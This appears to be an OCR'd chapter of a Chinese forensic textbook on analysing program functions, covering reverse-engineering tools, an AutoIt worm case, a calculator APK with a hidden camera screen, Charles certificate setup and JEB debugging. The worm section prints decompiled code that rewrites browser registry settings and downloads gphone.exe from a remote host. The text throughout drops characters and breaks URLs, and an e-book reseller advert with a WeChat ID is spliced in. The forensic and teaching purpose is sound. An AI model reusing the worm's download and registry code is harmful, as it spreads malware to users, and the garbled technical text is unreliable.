在鉴定工作中，部分鉴定流程涉及如抓包分析、功能复现或动态调试等，但由于程序本身的安全性较低，因此，通常借助模拟器来安装目标APP，在此基础上再完成这一系列的操作。雷电模拟器是款常的Android模拟器,其优势在于进动态调试时环境较稳定，但是在使模拟器多开功能时不能选择Android版本和位数。雷电模拟器官下载地址：https://www.ldmnq.com/other/version-history-and-release-notes.html?log=4&n = 6001。

## 3.抓包工具

抓包是进程序的网络流分析时必不可缺的关键操作，前的抓包工具主要分为移动端的抓包具和电脑端的抓包具。

（1）移动端抓包工具：HttpCanary HttpCanary不仅支持抓取 HTTP、HTTPS、WebSocket和TLS/SSL等协议数据，还持数据包收藏、备注、保存、分享、复制等功能。HttpCanary工具可通过GooglePlay商店进下载安装。

(2）电脑端抓包工具：Charles Charles是一款收费的抓包工具，可在Windows、MAC、Linux等平台上使,使前需要进代理设置和证书安装。Charles使起来简单便,抓包结果以树状结构展示，Charles官下载地址：https://www.charlesproxy.com/latest-release/download.do

## 4.脱壳工具

当处理安卓APK加壳情况时，常的动化脱壳具BlackDex。该具是个能运在Android5Android12操作系统上的脱壳具，其在安装使时须依赖Root、Xposed等特定环境，可对已安装或未安装的APP进快速脱壳。BlackDex官下载地址：https://github.com/CodingGay/BlackDex。

## 5.反编译工具

(1) JADX-gui JADX-gui是款免费开源的反编译具，使该具反编译出来的APP代码更接近JAVA代码，并具备强大的搜索功能。此外，JADX-gui还提供了直观的界面展示。JADX-gui官方下载地址：https://github.com/skylot/jadx/releases。

(2)JEB JEB分为三个版本：JEBCommunityEdition（社区版）、JEBAndroid（Android版）、JEBPro（专业版），这三个版本均持多平台使用。关于每个版本所持的功能可参考官网的介绍。官网地址：https://www.pnfsoftware.com/jeb/，其中，Android版和专业版需付费购买证书才能使。JEB官下载地址：https://www.pnfsoftware.com/。

## 二、程序功能鉴定的适用标准

对程序的功能性鉴定，应根据委托方需求以及检材程序类型，选择恰当的技术规范。目前，适用于一般计算机程序功能鉴定的标准，包括GA/T757—2008《程序功能检验方法》、GA/T8282009《电物证软件功能检验技术规范》、SF/ZJD04030042018《软件功能鉴定技术规范》。适用于一般移动终端APP鉴定的标准，包括SF/T0145—2023《智能移动终端应用程序功能鉴定技术规范》、SF/T0157-2023《移动终端电子数据鉴定技术规范》和GA/T1571—2019《法庭科学Android系统应程序功能检验法》。如委托明确需要对检材程序是否为破坏性程序进行鉴定，且检材程序是否为具有木马、蠕、勒索病毒等特征的恶意程序，应选择

GA/T1713—2020《法庭科学破坏性程序检验技术法》或SF/ZJD0403002—2015《破坏性程序检验操作规范》。 代找电子书资源，新书可代做扫描制作加微信 asxiao90

## 第二节 程序功能鉴定技术

## 一、基于静态分析的程序功能鉴定

## (一)程序逆向

## 1.EXE程序逆向通用流程

对于获取的样本程序，其逆向分析过程可概括为以下步骤：

（1）查看是否加壳 ExeinfoPE和PEiD两款具可于查看EXE程序是否加壳。若存在加壳情况，则需优先对程序进脱壳，才能进后续的分析操作。其中，PEiD提供了脱壳插件，如unpacker forupx插件，用于应对UPX加固。

(2)分析开发框架及开发语言 ExeinfoPE工具提供了程序开发语言的解析功能，可对Delphi、C++等常语开发的程序进解析。然,该具在分析使Python开发的程序时，可能会将其识别为MicrosoftVisualC++。这种情况可能源于软件本的限制。

常见的分析开发框架及开发语的法是关注动态链接库件及相关的特征件。例如，文件目录中包含明显的“gt”关键词，则判断该程序基于QT框架开发，且QT框架是一个C++APP开发框架;EXE程序中的DLL件中包括MSVBVM60.DLL，则断定该程序是使用VB6.0开发的，而包括MSVBVM50.DLL，则是使用VB5.0开发的。对于包含除DLL文件外的动态链接库，如pyc、pyd等，该程序大概率使用Python开发的，并使用Python提供的打包工具进行打包。

该过程的目的在于区分不同的开发语，可对应选择合适的反编译工具，如C#开发的程序可使Reflector进反编译。逆向的的是将存储于EXE件内的代码件提取并解析，将其中的机器语转变为汇编代码，进而部分编译器能将汇编语转化为伪代码。

（3）根据需求分析功能对于委托方明确需要分析的功能点，可先大致分析实现该功能需要调的底层接，然后对相关接的调情况进搜索。若委托并不明确该程序的功能情况，以Windows病毒程序为例，应该关注该程序对系统底层接口，如读写文件等文件操作、注册表操作相关接口。若是木马程序，还应该关注该程序调用的网络接口，如Socket。分析汇编代码和伪代码从需求和功能出发，通过关键词定位，寻找特定API等方式，进局部代码分析。

（4）动态调试 在静态代码分析过程中定位关键词和关键API后，在动态调试过程中可通过下断点和单步调试来优先定位关键函数或关键词，从进针对性的功能分析。动态调试的具体过程将在后续章节中详细介绍。

## 2.AutoIt脚本程序逆向

AutoItv3是种类似BASIC脚本的免费软件，于实现WindowsGUI动化操作及其他常规脚本任务。它使模拟击键、鼠标移动和窗/控件操作的组合，实现其他语法实现或是法简单实现的功能。Autolt常且独，可在所有版本的Windows上直接使,需复杂的运环境。

当前AutoIt最新版本为V3.3.16.1，在AutoIt官网下载安装包后可查看其API文档，官方还提供了Autolt的编辑工具SciTE4AutoIt3，持对Autolt函数的补全，脚本编辑完成后将被以au3后缀的格式保存，该格式的Autolt脚本内容可直接查看且右键选择“run script”即可执。

AutoIt 官方下载地址：https://www.autoitscript.com/site/autoit/downloads/。

SciTE4AutoIt3官方下载地址：hps://www.autoitscript.com/site/autoit-script-editor/。

编写脚本test_AutoIt.au3，该脚本中使用两种方式调用函数MsgBox（），用于在Windows界面弹出提示框。一种是在脚本内直接调用MsgBox（）函数，另一种是在自定义函数内调用MsgBox（）函数，如图19-1所示。

![](images/34b5a7d0030fb33a74d33ddaf08e55c0ac4663a145cf4ebb7108a6f28a16159e.jpg)  
图19−1自定义函数调用MsgBox()函数

两种方法都能够实现弹出提示框，且从该脚本可看到，脚本内优先调用了自定义函数TestFunc(），而后才编写了该函数的定义，执行过程中按照代码顺序执行，先弹出了“HelloAutoIt”提示框后弹出了“testMessageBox”提示框，该过程并未产报错，说明定义函数的定义和调在编写脚本时的先后顺序不会影响脚本的正常执。

Autoltv3提供了官方的编译工具Aut2Exe，该工具支持将后缀为au3的源码文件编译可执件EXE或是A3X，工具还提供了打包时设置应用图标贴图的选项。

对于通过上述方式生成的可执行文件（EXE和A3X），接下来介绍2种反编译工具用于获取其au3源码文件：

(1)exe2aut 开源工具exe2aut能将通过工具Aut2Exe编译得到的可执行文件EXE进反编译，但需要注意的是该工具只持反编译32位EXE文件而不支持对A3X文件的反编译，即该工具只适用于使用32位Aut2Exe编译得到的EXE文件。对于64位的文件，需要借助开源工具Autoit64to32,将64位文件转化为32位文件，再使用工具exe2aut进行反编译。

工具Autoit64to32下载地址：htps://github.com/g4xyk00/autoit64to32。

工具 Aut2Exe 下载地址：https://github.com/imawizard/Exe2Aut。

对64位的可执行文件test_Autolt.exe使用工具Autoit64to32进行转换，得到转换为32位的文件test_AutoIt_32.exe。使用工具exe2aut 对文件test_AutoIt_32.exe 进行反编译，得到 au3源码文件 test_AutoIt_32_au3。

(2) Autoit3 Decompiler Autoit3Decompiler是一个功能常强的开源具，持对通过Aut2Exe编译得到的EXE和A3X文件进行反编译，但由于作者已停止了更新，目前该工具支持的AutoIt 版本为3.0.100.0 至3.3.7.18。下载地址：https://bbs.kanxue.com/thread-

154785.htm。

使Autoit3Decompiler对测试样本.a3x进反编译，在路径下成录测试样本.a3x_dec,其中件0000.au3为au3源码件,如图19-2和图19-3所。

![](images/7d12158f911dd25079504974fc636d9166c66362f68bd6146fe009952c367977.jpg)  
图19-2 使Autoit3 Decompiler进反编译

![](images/9d0417ffd1f84de47f489758838144345bb669a3307418f46ac998bcd93c973e.jpg)  
图19-3 0000.au3件

## 3.APK应逆向

APK逆向是将APK件中classes.dex重新还原为“.class”件的过程就称之为逆向。在鉴定工作中，为了快速解决委托的需求，鉴定人员进逆向操作时常用的反编译工具大多是将未加固或已脱壳的APK直接导反编译具中，等待解析即可对代码进分析。

为了使读者能够更加深刻地理解反编译的原理，在此主要使apktool和dex2jar两个具结合反编译工具来对案例程序件calc.apk的反编译过程进讲解剖析。其中apktool用于获取APK文件的资源文件,dex2jar用于将文件classes.dex转换为jar包，最后使用反编译工具读取jar包中的“.class”文件。

对APK文件calc.apk进行反编译，主要过程如下：

将APK文件 calc.apk 移到apktool 工具所在目录“E：\逆向工具\apktool”下，打开Windows命令行终端进入apktool 工具所在目录;使用命令“apktool.batd -f calc.apk”获取APK文件calc.apk的资源文件，如图19–4所示。

![](images/3902a4d99da020896a3ebf8a0585a8ed405821ac548bb5b896385c223cf205a9.jpg)  
图19−4使用命令"apktool.bat d -f calc.apk"

命令运行结束后在目录“E：\逆向工具\apktool”下生成了一个与APK文件同名的目录，该目录下生成APK文件calc.apk 的资源目录res和配置清单文件AndroidManifest.xml以及smali代码文件等。

使用解压缩工具打开APK文件calc.apk，将包含Android代码集的可执行文件classes.dex提取到工具dex2jar所在目录“E：\逆向工具\dex2jar-2.0”下。再次打开命令行窗口，进入目录“E:\逆向工具\dex2jar-2.0",使用命令“d2j-dex2jar.bat classes.dex”将文件classes.dex中转换为jar包，如图19-5所示。

![](images/1a16e70c06235e1bbb89302ccd55c0fff8c5fba770c6728c22ab02e4ec8f1d36.jpg)  
图19 –5使用命令"d2j-dex2jar.bat classes.dex"

命令行代码运行结束后生成文件classes-dex2jar.jar，该jar包中聚合了APK文件calc.apk的所有“.class”文件。使用任一反编译工具打开该文件即可获得APK文件calc.apk的Java源代码，如使用反编译工具JADX-gui成功打开该jar包后界面如图19-6所示。

## （二）代码分析

无论是源代码还是伪代码,还是汇编代码，分析代码的方式都是从功能和需求出发，若是程序能够功能复现，则优先通过复现其功能掌握一个程序能够实现的功能以及具有怎样的界面特征，该过程意在获取该程序界面内或是功能的关键特征，用于在后续代码分析过程中进行关键位置定位。

通过关键功能API或是程序界面内的关键词或控件名称定位跳转到指定的代码段后，关注上下文以及附近出现并被调用的函数，通过该种方法快速对程序指定代码段及功能的实现方式进行分析。

![](images/5290b9e2231234b90dde27a8ba3214c0bc0a858c73f0550d60755629e15a4c0d.jpg)  
图19-6使用JADX-gui成功打开该jar包后界面

## 1.AutoIt蠕病毒样本分析

本次使用的样本为测试样本2.exe，如图19-7所，根据微步在线云沙箱“https://s.threatbook.com”的分析，初步判断该样本的马家族为Autolt,且具有蠕特征。

![](images/2c9fbedd6ef8f00b71a888175f5eafd00e4b9902f288456a286c1ee04da65ca2.jpg)  
图19-7 测试样本2.exe分析结果

使Autoit3Decompiler对测试样本2.exe进反编译，得到Autolt源码件0000.au3,使VisualStudioCode查看件内容，如图19-8所。代码中定义了静态变量\$WEBSTORAGE，其中存储有站链接“htp：//rnd009.googlepages.com”。

![](images/a1d2b82434cf9c86230ab7034a6317a24359cf17428b67e795e182487037ea31.jpg)  
图19-8 查看件内容

该程序通过函数RegWrite(）对注册表进修改,将注册表中设置IE浏览器主页、默认搜索页码等默认设置修改为“htp://rnd009.googlepages.com/google.html”,如图19–9所。

```autoit
FUNC SETBROWSERHOMEPAGE()
IF SAIFTYCHECK("setBrowserHomePage") THEN
$MYWEB =GETHOMEPAGE()
REGWRITE("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet ExplorerMain"，"Default_Page_URL"，"REG_SZ"，$MYWEB)
REGWRITE("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\InternetExplorer\Main"，"Default_Search_URL"，"REG_Z"，$MYWEB)
REGWRITE("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\InternetExp1orer\Main"，"SearchPage"，"REG_SZ"，$MYWEB)
REGWRITE("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main","Start Page","REG_SZ",$MYWEB)
REGWRITE("HKEY_LOCAL_MACHINE\Software\PoliciesMicrosoft\Internet Explorer\Control Pane1"，"HomePage"，"REGDWORD",
REGWRITE("HKEY_CURRENT_USER\Software\Microsoft\InternetExplorer\Main"，"StartPage"，"REG_SZ"，$MYWEB)
```  
图19-9 修改函数RegWrite()

该程序运的过程中，能够从远程服务器“rnd009.googlepages.com”中下载件gphone.exe和setting.exe到本地，如图19-10所,并将件属性修改为RSH（只读、系统件、隐藏），如图19-11所。

```perl
FUNC DOWNLOADURL()
$FILEURL= $WEBSTORAGE &"/"&$SETTING & $INI
$LOCALCOPY=$INSTALLDIR &"\"&$SETTING &$INI
FILESETATTRIB($LOCALCOPY，"-RSH")
INETGETSIZE($FILEURL)
IF @ERROR THEN
DEBUG("Error:Unable to connect "& $FILEURL &" ABORTING.")
RETURN
ENDIF
IF INETGET($FILEURL,$LOCALCOPY,0x00000001, θx00000000) THEN
DEBUG("Downloaded "& $LoCALcOPY &" Sucessfully from "& $FILEURL)
ELSE
DEBUG("Error:Failed to save file "& $FILEURL &" at"& $LoCALcOPY)
ENDIF
```  
图19-10 下载件

FUNC GETBINARYPATH(）   
\$WEBSTORAGE = GETVAR("Webstorage", \$WEBSTORAGE)   
\$BINARYPATH = \$WEBSTORAGE& "/"& GETVAR("filedownload1", "gphone") &".exe"   
RETURN \$BINARYPATH   
ENDFUNC  
图19-11 修改件属性

该过程中使到的函数包括：InetGet（）,该函数可通过HTTP、HTTPS或FTP协议从互联上下载指定件;FileSetAttrib（）函数可修改个或多个件的属性。

该程序创建件autorun.ini,并使函数IniWrite（）在ini件内写命令，使Autorun命令动执程序gphone.exe,如图19-12所。

![](images/c6005444999913154b09d276d9fd1d268cc41eba5b1ddc0320406c44e06a4457.jpg)  
图19-12 创建件autorun.ini

该程序能够检测本地是否安装应用YahooMessenger,若检测到未安装，则通过网络进下载并安装，如图19–13 所示。

![](images/30e8ed7b756ff7bb3b8eadd14d6125ce9664a7111fa46e41818c068b9f273943.jpg)  
图19– 13安装应用Yahoo Messenger

在函数SENDYMMESS（）中，通过函数GETBINARYPATH（）获取远程服务器“rnd009.googlepages.com"中程序gphone.exe的下载地址，如图 19– 14 所示，然后通过函数 ClipPut（）将剪切板中的下载地址复制到应用Yahoo Messenger 的发布窗口，并通过函数Send（）将信息发布到应用YahooMessenger 的社交平台上，以此方式将该程序在应用Yahoo Messenger 中传播，如图19-15所示。

```powershell
FUNC GETBINARYPATH()
$WEBSTORAGE = GETVAR("webstorage", $WEBSTORAGE)
$BINARYPATH = $WEBsTORAGE &"/"& GETVAR("filedownload1","gphone")&".exe"
RETURN $BINARYPATH
```  
图19–14函数GETBINARYPATH()

![](images/b5e439e55f00fdd7245186ed940cb20b10c8863ad2d40bf7bc2aa016df47ff1d.jpg)  
图19-15 函数Send()

进一步分析发现，该程序同样能够在应用Google Talk中自动发布信息。

当某个用户无意间在应YahooMessenger或Google Talk中点击了该恶意程序自动发布的链接，通过上述方法，远程服务器会将恶意程序下载到用户设备，并通过自动化脚本自动执行，执行后该主机同样被修改浏览器主页和注册表，并在应用内向他人自动发送该链接，成为蠕虫病毒传播的一环。

## 2.APK样本"calc.apk"功能代码分析

样本程序calc.apk在安装运行后，看起来是一个计算器，但其实该应用会通过输入指定的口令进入隐藏模块，隐藏模块是一个具有拍照功能的界面。

(1）验证程序calc.apk是否具有隐藏的拍照界面 对样本程序calc.apk 进行反编

译,反编译完成后打开配置清单件AndroidManifest.xml,查看到该程序共有2个Activity，分别为“com.xiaomi.calculator.CameraActivity”和“com.xiaomi.calculator.CalculatorActivity"，如图19-16所示。

![](images/1897f6199348b19fe9e7d91bf6abf4d303e1b04be723a63d3769f962707830ab.jpg)  
图19–16查看AndroidManifest.xml

在雷电模拟器中安装该应用，安装完成后应名为“计算器”，启动该程序的活动界面如图19-17所。

打开Windows命令窗,使命令“adbdevices”查看已开启的模拟器是否处于可连接状态。当状态为可连接时，使命令“adb shell am start-Dcom.xiaomi.calculator/com.xiaomi.calculator.CameraActivity”直接跳过输隐藏令的步骤，查看活动界“com.xiaomi.calculator.CameraActivity”的内容。上述命令运结束后,模拟器上会弹出个弹窗提选择是否调试，点击“CONTINUERUN”即可看到隐藏的拍照界，如图19-18所。

![](images/87ac8d08f311d8278258053e87ed947470c041f0a7f2087da42eff209baddddc.jpg)  
图19-17 启动该程序的活动界面  
图19-18 查看隐藏功能

(2）分析进拍照Activity的隐藏令 进程序Activity:“com.xiaomi.calculator.CalculatorActivity”，搜索关键字startActivity，定位到按钮buttonArr所注册的监听器setOnClickListener（）方法，点击按钮buttonArr时就会执该监听器下的onClick（）方法，如图19-19所示。onClick（）方法中，通过getText（）方法获取点击按钮buttonArr时所携带的数据，当该数据的值等于“+-\*/（）”，就跳转到带有拍照功能的Activity界面“com.xiaomi.calculator.CameraActivity”。到此就成功分析出了进入拍照 Activity的隐藏口令为“+-\*/（）”。

![](images/901a09dcb37031371590cb7d4510225c66afcc0b8791903f8aeacb05dd56ef61.jpg)  
图19-19 查看onClick()方法

## 二、基于动态分析的程序功能鉴定

## (一)功能复现

在程序功能性鉴定过程中，由于程序功能复杂且反编译后的代码量庞大，不通过功能复现来判别程序功能将耗费大量时间来定位关键代码。功能复现可以帮助鉴定员快速判断运时调用的方法，并获取运行输出信息，从而加快代码分析和关键代码段定位。

在SF/ZJD0403004—2018《软件功能鉴定技术规范》中，规定了功能复现过程中的一些注意事项：①功能复现需要确保送检程序成功安装后并启动，按照程序运行的步骤，逐一运行该程序需要鉴定的各项功能；②若送检程序无法正常运行，则停止功能复现的步骤，并进行相关记录；③需按照指定的鉴定规范对功能复现全过程进录像。

## (二)动态监控

## 1.动态监控准备事项

动态监控多用于对恶意程序的为检测，通过反复运该程序，观察测试系统产生的变化，并借助监控工具分析其对系统内文件、注册表、进程等产生的影响。

在对样本进监控前，先要准备一个纯净的测试环境，以在Windows环境下运的恶意程序为例，使用VMware等工具搭建一个新的Windows 10虚拟机。在Windows10虚拟机中安装进程监听具ProcessMonitor以及其他必要的具,搭建好能够使恶意程序正常运的系统环境，然后导恶意程序后保存次虚拟机快照。

在次运恶意程序前，切断虚拟机与物理机的件系统关联，比如VMWare带的共享文件夹功能，以及磁盘映射功能，以防恶意程序污染物理机的文件系统。此外，还需通过微步在线云沙箱等工具判断该程序是否具有网络横向传播的功能，由于部分恶意程序会接收远程服务器下发的指令或文件，若完全切断虚拟机网络，可能无法完全复现恶意程序的功能，但连接网络又存在恶意程序横向传播的风险，所以首次运前使用公开云沙箱对程序进提前分析，查看其是否具有横向传播功能，并且在首次执行程序时断开网络，切断与物理机的网络连接是明智的选择。

## 2.案例“测试样本2.exe"

本节的测试案例样本仍使用代码分析章节中的测试样本2.exe，前面的案例已初步判断该样本的木马家族为AutoIt,且具有蠕虫特征，使用微步在线云沙箱“https://s.threatbook.com/"分析其网络行为，发现其在64位Windows7环境下存在网络行为，但不包含横向传播的功能，如图19-20所示。

![](images/1c5315153ac2a54e8f4f99d2d5e411a953a1fb535a23c828822fcc8294a21e82.jpg)  
图19-20 测试样本 2.exe 分析结果

使用 VMware 搭建Windows 7 的 64位虚拟机，并安装 Process Monitor 3.92版，安装完成后建虚拟机快照，关闭虚拟机后拍摄快照的效率要远于开启虚拟机的状态。

重新进系统后，运ProcessMonitor，保持默认筛选规则不变，在确认程序已经开启监听进程后运行程序测试样本2.exe。设置过滤指令为“ProcessName is 测试样本2.exe thenInclude”用于筛选出进程名为测试样本2.exe的操作，如图19–21所示。再设置过滤指令为“Operation is CreateFile then Include”用于筛选出创建文件的操作。

![](images/4b920ff50191a18022c95c5f216d0d1ff0995e69da19f7d1f9ec7f8904d9f1ac.jpg)  
图19– 21 Process Monitor Filter 根据测试样本2.exe 过滤

设置上述过滤条件后，仅选择“文件系统”相关操作，发现与该程序有关并被该程序创建的文件 gphone.exe、seting.ini 以及autorun.ini,如图19-22所示，根据代码分析章节对该程序反编译代码的分析可知，gphone.exe和 setting.ini为远程服务器向该程序宿主机下发的文件，autorun.ini由该程序自动创建并写入了自动化执行程序gphone.exe的指令。

![](images/848ce11898354da479b0a4528cfd7f0e89a6f68e823488e3d47085efe1ae8f20.jpg)  
图19-22过滤结果1

将过滤指令修改为“Operation is RegSetValue then Include”，并选择仅“注册表”相关操作，发现该程序存在修改注册表中浏览器首页为“htp：//rnd009.googlepages.com/google.html”的操作，以及对浏览器其他设置(比如是否开启代理)的修改，如图19–23所示。

![](images/9b33042087a2035a1e6eb29e478485d82d5afb68346f1715221d0a4000fa746d.jpg)  
图19 – 23 过滤指令修改为"Operation is RegSetValue then Include"

将过滤指令修改为“Operation is Process Create then Include”，如图 19– 24所示，并选择仅“进程”相关操作，发现该程序存在启动cmd.exe 并通过命令行调用gphone.exe的操作，与autorun.ini 内定义的自动化命令相符。

![](images/8a60694862c6ca2dada2adac7f5b5f80ef9c0cfe2cc8174147ae36b76e9ec390.jpg)  
图19 – 24 过滤指令修改为"Operation is Process Create then Include"

## (三)动态抓包

抓包是通过使用第三的抓包具对客户端与服务端在通过网络进通信时所传输的数据进行拦截，然后对拦截的数据进行分析的过程。

## 1.使用 Wireshark 进行数据流量分析

由于Wireshark本身功能的强大性，在部分案件的鉴定过程中，经常使用它对网络数据流量进行截取和分析。在分析过程中，通过对数据流量中的请求数据、响应数据以及所请求的接等进分析判断所检程序的流量向，能够对其攻击段作出准确的判断。

(1)Wireshark 介绍 启动Wireshark，选择对本地的以太网进行捕获，如图19–25所示。

![](images/2a5e6fc705ae8d9bfae34233cc638494b14ac6d3a279fc75af2983eaadb8946f.jpg)  
图19– 25 启动 Wireshark

点击工具栏中的“”开启捕获，在浏览器中输入目标任意网址。数据流量捕获完成停止捕获即可看到当前界面中包含了很多类型的数据包，如图19–26所示。

![](images/314f2aa40228f932e8dccfa1003e88695683cab07ad1b9153a50c8868b9ca4ce.jpg)  
图19-26 数据流量捕获完成

在Wireshark抓包完成并选择指定的数据包后，在界面左下方的数据包的详细信息中能够查看到已选择数据包的详细信息。

(2)使用 Wireshark 对某阅读器应用进行抓包分析 打开Wireshark并开启抓包，在模拟器中打开目标应用，并在该应用中搜索指定小说名并查看该小说的内容。停止Wireshark 抓包，在应用显示过滤器中使用关键词“HTTP”过滤已抓取的HTTP数据包结果，并使用Wireshark追踪对应数据包的HTTP流，如图19–27所示。

![](images/0a861b60a1a407e18606fbdbc5166b6c3584dee608b40dafe43069722072ed2e.jpg)  
图19– 27使用Wireshark追踪对应数据包的HTTP 流

上述内容表明该应在搜索指定说时会向指定的接发送HTTP请求，该请求返回结果中包含了说搜索结果，如图19-28所。查看说内容时，该应会向另地址发送请求，以获取说章节录及章节内容。

![](images/3b145cec9e94dbecb6934d1055f4c4ad7144cb72a0ef8e76664346f0445c4ad7.jpg)  
图19-28 返回结果部分内容

## 2.使用Charles实现安卓模拟器抓包

Charles是款收费的抓包具，除能在Windows平台上使外还能在MAC、Linux平台上使。使前需要进代理设置和证书安装。

证书安装步骤如下：

(1）本地证书安装 进Charles左上第标题栏中的“Help”→“SSLProxying”“Install Charles Root Certificate”,勾选“Allow remote computers to connect'”,安装Charles的根证书，如图19-29和图19-30所。

![](images/cbf55f1ab9cd73de75f281cdf47ef5fecf526dea54c4748c819b28c48f6c7755.jpg)  
图19-29 安装Charles的根证书

(2）代理IP及端口设置 点击标题栏中的“Proxy”→“ProxyingSettings…”,在弹出的界中勾选“EnableSSLProxying”,然后如图19-31中的步骤进设置，允许拦截任何主机的任意端的请求数据包。

(3）模拟器证书安装（以夜神模拟器为例） 由于Android7后，系统对户安装的证书采取默认不信任的安全策略，所以在使Android7以上版本的模拟器时必须在root权限下通过动的式将证书导系统证书路径,否则法正确地获取到HTTPS数据包。

依次点击标题栏中的“Help”→“SSLProxying”→“Save Charles Root Certificate”,如图19-32所，将Charles的根证书导出桌并命名为Charles.pm。

![](images/e1bf286bd4f4e98b5b96afb9c2b95c512c7323218395a2a390810900e063e0d9.jpg)  
图19-30 查看Charles的根证书

![](images/8d99772cc989f212800e8ad360eaea510743cbc6aa1e98b7a6f1c1363ead344d.jpg)  
图19-31设置代理IP及端口

![](images/eab9fe6adcdfa81a43cdac59ac1ff710ce35c820283e61314133b38cba127abe.jpg)  
图19–32 导出Charles 的根证书

打开 Windows 命令行终端，使用命令“openssl x509 -subject_hash_old -in D:\Desktop\Charles.pem”查看证书文件的Charles.pm 的加密 hash，如图19–33所示。成功获取到该证书文件的hash值为5bed5234,将证书文件重命名为5bed5234.0。

![](images/1e9fd3a7440eb4b8bed4e50ef5c43de3a2d05ca7577d33f477ea6f132c5cf526.jpg)  
图19–33 查看证书文件的Charles.pm 的加密 hash

打开夜神模拟器，在Windows命令行终端执行命令“adbdevices”查看该模拟器是否处于可连接状态。当模拟器可连接时，输入命令“adb push D:\Desktop\5bed5234.0 /sdcard/”，将Charles 的根证书文件5bed5234.0 推送至模拟器中的“/sdcard/”目录下。推动完成后使用命令“adb shell”进入模拟器终端，使用命令“mount -o remount,rw /system"将system 目录修改为读写权限。再次使用命令“cp/sdcard/5bed5234.0/system/etc/security/cacerts/"将文件复制到系统证书目录“/system/etc/security/cacerts/”中，然后使用命令“chmod 644/system/etc/security/cacerts/5bed5234.0”赋予文件相关权限，如图19–34所示。

![](images/9f3f20e4debee4625d18401927bafa72006b93af8eb120d8693ce17c44a5226c.jpg)  
图19-34 进入模拟器终端

(4)模拟器代理设置 点击Charles的工具栏中的“Help”→“Local IP Addresses”中查看本地IP地址;在“Proxy”→“Proxy Settings”中查看Charles 的监听端口，如图19– 35和图19-36所示。

![](images/d7f540352fc56379906ec9f7e213ada3a93b9286046e8ce7d051ca07c16d5f13.jpg)  
图19– 35 查看 Charles 的IP 地址

进入模拟器系统设置后点击WLAN，点击已连接的网络WiredSSID并长按，在弹出窗口中点击修改网络，进入高级设置中，将代理方式设置为手动，并将代理服务器主机名设置为上述查看的本地IP 地址，代理服务器端口号设置为Charles 的监听端口 8888，如图19–37所示。

![](images/4e1b70d4a534583b55a52d1d96cb02e7c2f92cff7e173e9aa3edcc89e91479c5.jpg)  
图19-36查看Charles的监听端口

![](images/4570836fc3baa169fda606a939216360e184835c768791d86520961ae89e793e.jpg)  
图19-37 设置为Charles的监听端口8888

设置完成后弹出个是否允许接收数据包的选择对话框，选择“Allow”（允许）后即可对模拟器中的APP进抓包分析。

使该抓包具对模拟器中已安装说阅读应进抓包，运该应并同步开启Charles进抓包。当点击某书籍时进阅读界时，查看Charles抓包结果。该应点击阅读指定书籍时向目标地址发起请求，该请求携带的参数如图19-38所。

![](images/513cf3451d66214ca4d348e67f38408a1da2f72711f0a5fd78922ea6e51bf860.jpg)  
图19-38 请求携带的参数

该请求的请求头部分信息如图19-39所。

![](images/2663089b75346046bc0c180cfd307ac30124172d971881d8aaf3638174b9ecc7.jpg)  
图19-39 请求的请求头部分信息

该请求在请求头使字段“Content-Type”指定了服务器所返回的数据须为Json格式。该请求所返回的部分Json数据如图19-40所。

![](images/239b6c3773b60cbe7a629c9b626026d47805b5beca96179f09d0c308aad8b102.jpg)  
图19-40 请求所返回的部分Json数据

## (四）动态调试

动态调试是通过反编译具自带的调试器通过断点调试等式来对APP运时的情况进跟踪。

## 1.APK动态调试

此节所使的案例APK件是security.apk，该APK在安装运后需要输指定的验证码才能进APP内。在委托也法提供验证码的情况下，鉴定员需要使动态调试的法对APP的运输出进监控，获取进该APP的验证码，否则法进步对其进分析。使动态调试获取验证码的步骤如下：

（1）输验证码功能复现 在模拟器中安装APK件security.apk，安装成功后的应名为安全防护，运该软件后呈现一个加载页，请求从后台服务器中获取配置件的操作，等待响应完成后弹出填写验证码的弹窗。任意输字符串点击确定,验证码输错误时提以下信息“警告！验证码失败”,如图19-41所,该信息可帮助鉴定员在进代码调试的操作时快速定位关键代码。

![](images/3a611e80cea1223008eac7f57f0a248a108bb00c56e1b1badb2b454307d7593d.jpg)  
图19-41 验证码输入错误时提示信息

(2)反编译定位关键代码 使用反编译工具JEB对软件security.apk进行反编译，获取该程序的源码。

在当前的字节码文件中使用快捷键Ctrl+F调出JEB自带的搜索功能框，搜索验证码输入错误时所弹出的提示信息“警告！验证码失败”，点击寻找，定位到图19-42中的代码行。

![](images/ac6af0b5658af5507a7b11ffbdd56e7d2f05eb24eda31b7ff9eaff3a8520e401.jpg)  
图19-42搜索验证码定位到代码行

对该行代码进行解析，定位到类“com.icbcbfife. hdadgeff. SecretWelcomeActivity”中的checkCode（）方法，在checkCode(）方法代码段中实现对验证码的检查。首先使用getText（）方法获取输入框editText中的值。再使用toString（）方法将该值转换为String类型，最后将该值与“BaseApplication.configInfo.getStartpass（）”所传入的值相比较，如果两者相等则进入下一个用户界面BankMainActivity，如果不等就弹出上述提示信息并退出当前用户界面，如图19–43所示。

![](images/1f0d13fe4ac3d366682b74c325df8aa565c77cf23a9a751a2a7c5379e9c28658.jpg)  
图19-43搜索验证码定位到代码行进行代码解析

(3）下断点进动态调试时断点的位置是比较关键的一步，这可将断点设置在判断验证码是否正确的代码行。返回到字节码文件页面，然后找到上述代码行所对应的Smali语句，选中该行，点击JEB工具栏中的“调试器”，点击“打开或关闭断点”选项，选择在此处下断点，如图19-44所示。当在代码行的最左边会出现一个小红点时，表示已经成功标记了断点所在位置，待程序运行到此行代码时会停止。

(4)动态调试获取验证码 再次点击JEB工具栏中的“调试器”，点击“开始”，成功连接到模拟器后选中处在运行中的安全防护的进程，点击选项卡下方的“附上”对该进程进行附加调试，如图19–45所示。

![](images/d9e26fb1f6f740363f23ebc59604355ac4d2885880cf15300c1318c4ff7a2727.jpg)  
图19-44 断点设置

![](images/f06e6e37d9749fa865925f502db7fc79f5aa01482280e171cd7b77d9c566c3cd.jpg)  
图19-45 附加调试选项

附加成功后界面最右边就是调试窗口，其中有线程的窗口：VM/线程，查看断点的窗口VM/断点，以及查看局部变量的窗口：VM/局部变量，局部变量窗口中会记录APP运过程中产的变量的值，如图19-46所。

![](images/5ebcd643fca15b13ee39388ae44c56db3aefb2e916e7aefa1d18ea0e531667c7.jpg)  
图19-46 附加调试界面

返回模拟器中，在安全防护APP的运行界面输入验证码123456后点击确认，如图19-47所示。

